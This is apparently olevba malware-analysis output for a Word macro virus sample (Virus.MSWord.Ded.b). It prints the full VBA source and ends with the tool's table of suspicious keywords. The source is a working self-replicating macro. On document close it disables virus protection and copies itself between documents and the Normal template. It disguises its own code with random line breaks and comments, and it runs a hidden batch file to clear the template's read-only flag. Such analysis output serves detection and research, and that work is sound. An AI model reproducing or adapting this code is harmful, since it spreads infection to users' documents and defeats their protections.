olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.b-dff738d32293a092701f52eefbaeb9e781b5546d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.b-dff738d32293a092701f52eefbaeb9e781b5546d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private Sub Document_Close()
'26,37929
  On Error _
GoTo skam

 _
Options.VirusProtection = unimplemented

     SWL
'4,564917
    ABS99
'16,04415
skam:
'32,62062
 _
 End Sub

 _
     Private Sub SWL()

 _
      If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 _
For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

   d = NormalTemplate. _
VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
   If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 _
     While Mid(d, Len(d) - 1, 2) = " _"

  i = i + 1
'7,395333
 _
           d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

          Wend
'19,19225
 _
  d = e(d)

 _
      ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
  End If

  Next _
i

 _
  ActiveDocument.SaveAs AddToRecentFiles:=False

 _
   End If

 _
   End Sub

 _
  Private Sub ABS99()

         If Not NormalTemplate.VBProject. _
VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

      f _
(NormalTemplate.FullName)

     For i _
= 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
            d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
  If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 _
       While Mid(d, Len(d) - 1, 2) = " _"

        i _
= i + 1

         d = _
Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
         Wend

 _
d = e(d)

 _
     NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
    End If

 _
      Next i

 _
    NormalTemplate.Save

                End If
'43,27595
 _
     End Sub

 _
               Private Function e(aString) As String

 _
  For i = 1 To Len(aString) - 1

 _
While Mid(aString, i, 2) = " "

 _
        aString = Left(aString, i) & Right(aString, Len(aString) - i - 1)

              Wend
'32,6144
 _
 If Mid(aString, i, 1) = "." Then

  If Not _
Mid(aString, i - 1, 1) = Chr$(34) And Not Mid(aString, i + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

 _
 If Not Mid(aString, i + 1, 1) = Chr$(34) Then

 e = _
Left(aString, i - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - i)

 _
    For J = 1 To Int(15 * Rnd)

 _
          e = " " & e

 _
         Next J

 _
            Exit Function

 _
      End If

   End _
If

 _
    Else

 _
      If Mid(aString, i, 1) = " " And Int(3 * Rnd) = 1 And i > 1 Then

 _
If Not Mid(aString, i + 1, 1) = Chr$(34) And Not Mid(aString, i - 1, 1) = Chr$(34) Then

                e _
= Left(aString, i - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - i)

       For _
J = 1 To Int(15 * Rnd)

 _
e = " " & e

 _
   Next J

            Exit Function
'49,20062
 _
     End If

 _
        End If

 _
          End If

 _
          Next i

            e = aString _
& Chr$(13) & "'" & (100 * Rnd)

              Count = _
Int(15 * Rnd)

For _
J = 1 To Count

 e = " " & e
'69,46075
          Next J
'30,96175
 _
       End Function

 _
           Private Sub f(fName)

 _
     If GetAttr(fName) And vbReadOnly Then

 _
    Open Dir(fName) & ".bat" For Append As #1

Print #1, "Attrib " & "-r " & Chr$(34) _
& fName & Chr$(34)

             Print #1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)
'95,04134
 _
 Close #1

 _
shellResult = Shell(Dir(fName) & ".bat", vbHide)

 _
            End If

       End _
Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

